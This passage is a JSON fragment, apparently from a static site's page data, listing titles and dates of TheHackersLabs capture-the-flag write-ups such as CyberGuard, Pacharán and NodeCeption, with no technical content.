Cypher","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"07","day":"29"},{"id":"TheHackersLabsCyberGuard","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","isEncrypted":false,"year":"2025","month":"07","day":"28"},{"id":"TheHackersLabsPacharán","title":"TheHackersLabs - Pacharán","date":"2025-07-27","isEncrypted":false,"year":"2025","month":"07","day":"27"},{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"}]},"__N_SSG":true}